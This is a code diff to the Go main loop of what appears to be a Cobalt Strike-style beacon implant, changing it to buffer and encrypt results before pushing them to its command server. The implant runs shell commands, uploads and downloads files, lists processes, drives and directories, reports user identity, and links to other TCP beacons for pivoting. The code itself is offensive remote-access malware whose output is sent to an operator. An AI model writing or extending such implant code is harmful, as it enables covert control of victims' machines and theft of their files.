@@ -18,7 +18,9 @@ func main() {
 	ok := packet.FirstBlood()
 	if ok {
 		for {
-			packet.CheckTcpBeacons()
+			resultBuf := make([]byte, 0, 100000) // holds all beacon output, should be the maximum length of a HTTP body
+			chainedResults := packet.CheckTcpBeacons()
+			fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))
 			resp := packet.PullCommand()
 			fmt.Printf("%x\n", resp.Bytes())
 			fmt.Printf("%d \n", resp.Response().ContentLength)
@@ -51,8 +53,9 @@ func main() {
 									case packet.CMD_TYPE_SHELL:
 										shellPath, shellBuf := packet.ParseCommandShell(cmdBuf)
 										result := packet.Shell(shellPath, shellBuf)
-										finalPaket := packet.MakePacket(0, result)
-										packet.PushResult(finalPaket)
+										finalPacket := packet.MakePacket(0, result)
+										// packet.PushResult(finalPacket)
+										resultBuf = append(resultBuf, finalPacket...)
 
 									case packet.CMD_TYPE_UPLOAD_START:
 										filePath, fileData := packet.ParseCommandUpload(cmdBuf)
@@ -81,8 +84,9 @@ func main() {
 										requestID := crypt.RandomInt(10000, 99999)
 										requestIDBytes := packet.WriteInt(requestID)
 										result := util.BytesCombine(requestIDBytes, fileLenBytes, filePath)
-										finalPaket := packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_START, result)
-										packet.PushResult(finalPaket)
+										finalPacket := packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_START, result)
+										// packet.PushResult(finalPacket)
+										resultBuf = append(resultBuf, finalPacket...)
 
 										fileHandle, err := os.Open(strFilePath)
 										if err != nil {
@@ -101,16 +105,19 @@ func main() {
 											}
 											fileContent = fileBuf[:n]
 											result = util.BytesCombine(requestIDBytes, fileContent)
-											finalPaket = packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_WRITE, result)
-											packet.PushResult(finalPaket)
+											finalPacket = packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_WRITE, result)
+											// packet.PushResult(finalPacket)
+											resultBuf = append(resultBuf, finalPacket...)
 										}
 
-										finalPaket = packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_COMPLETE, requestIDBytes)
-										packet.PushResult(finalPaket)
+										finalPacket = packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_COMPLETE, requestIDBytes)
+										// packet.PushResult(finalPacket)
+										resultBuf = append(resultBuf, finalPacket...)
 									case packet.CMD_TYPE_FILE_BROWSE:
 										dirResult := packet.File_Browse(cmdBuf)
 										finalPacket := packet.MakePacket(packet.BEACON_RSP_FILE_BROWSE_RESULT, dirResult)
-										packet.PushResult(finalPacket)
+										// packet.PushResult(finalPacket)
+										resultBuf = append(resultBuf, finalPacket...)
 									case packet.CMD_TYPE_CD:
 										packet.ChangeCurrentDir(cmdBuf)
 									case packet.CMD_TYPE_RM:
@@ -118,11 +125,13 @@ func main() {
 									case packet.CMD_TYPE_DRIVES:
 										driveResult := packet.ListDrives()
 										finalPacket := packet.MakePacket(packet.BEACON_RSP_OUTPUT, driveResult)
-										packet.PushResult(finalPacket)
+										// packet.PushResult(finalPacket)
+										resultBuf = append(resultBuf, finalPacket...)
 									case packet.CMD_TYPE_GETUID:
 										getuidResult := packet.GetUid()
 										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_GETUID, getuidResult)
-										packet.PushResult(finalPacket)
+										// packet.PushResult(finalPacket)
+										resultBuf = append(resultBuf, finalPacket...)
 									case packet.CMD_TYPE_CP:
 										// fmt.Printf("%x\n", cmdBuf)
 										fromPath, toPath := packet.ParseCommandCopyMove(cmdBuf)
@@ -137,19 +146,22 @@ func main() {
 										config.WaitTime = time.Duration(sleep) * time.Millisecond
 									case packet.CMD_TYPE_PWD:
 										pwdResult := packet.GetCurrentDirectory()
-										finPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_GETCWD, pwdResult) // 32
-										packet.PushResult(finPacket)
+										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_GETCWD, pwdResult) // 32
+										// packet.PushResult(finalPacket)
+										resultBuf = append(resultBuf, finalPacket...)
 									case packet.CMD_TYPE_LIST_PROCESS:
 										processList := packet.ListProcesses()
 										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_OUTPUT_PS, processList)
-										packet.PushResult(finalPacket)
+										// packet.PushResult(finalPacket)
+										resultBuf = append(resultBuf, finalPacket...)
 									case packet.CMD_TYPE_CONNECT:
 										target, port := packet.ParseCommandConnect(cmdBuf)
 										fmt.Printf("Attempting to connect to TCP beacon on %s:%d\n", target, port)
 										beaconId, encryptedMetaData := packet.ConnectTcpBeacon(target, port)
 										result := util.BytesCombine(packet.WriteInt(0), packet.WriteInt(beaconId), encryptedMetaData)
 										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_LINK, result)
-										packet.PushResult(finalPacket)
+										// packet.PushResult(finalPacket)
+										resultBuf = append(resultBuf, finalPacket...)
 									case packet.CMD_TYPE_EXIT:
 										os.Exit(0)
 									default:
@@ -159,23 +171,41 @@ func main() {
 										arg2Bytes := packet.WriteInt(0)
 										errMsgBytes := []byte("The feature you are trying to use is not implemented yet.")
 										result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
-										finalPaket := packet.MakePacket(31, result)
-										packet.PushResult(finalPaket)
+										finalPacket := packet.MakePacket(31, result)
+										// packet.PushResult(finalPacket)
+										resultBuf = append(resultBuf, finalPacket...)
 
 									}
 								} else {
 									fmt.Printf("cmdBuf is empty!")
 								}
 							}
+							if len(resultBuf) > 0 {
+								resultBuf = append(resultBuf, chainedResults...)
+								// send a consolidated output
+								packet.PushResult(packet.EncryptPacket(resultBuf))
+
+								fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))
+
+								fmt.Printf("Sending the following data:\n%x\n\n", resultBuf)
+
+								packet.PushResult(packet.EncryptPacket(resultBuf))
+							}
 						} else {
 							fmt.Printf("HMAC could not be verified. Ignoring command.\n\n")
 						}
 					} else {
-						fmt.Printf("Beacon checked in!\n\n")
+						if len(chainedResults) > 0 {
+							resultBuf = append(resultBuf, chainedResults...)
+							packet.PushResult(packet.EncryptPacket(resultBuf))
+
+						} else {
+							fmt.Printf("Beacon checked in!\n\n")
+						}
 					}
 				}
 			}
-			fmt.Printf("Cycle done, sleeping for %d seconds!\n\n\n", (config.WaitTime / time.Millisecond / 1000))
+			// fmt.Printf("Cycle done, sleeping for %d seconds!\n\n\n", (config.WaitTime / time.Millisecond / 1000))
 			time.Sleep(config.WaitTime)
 		}
 	}
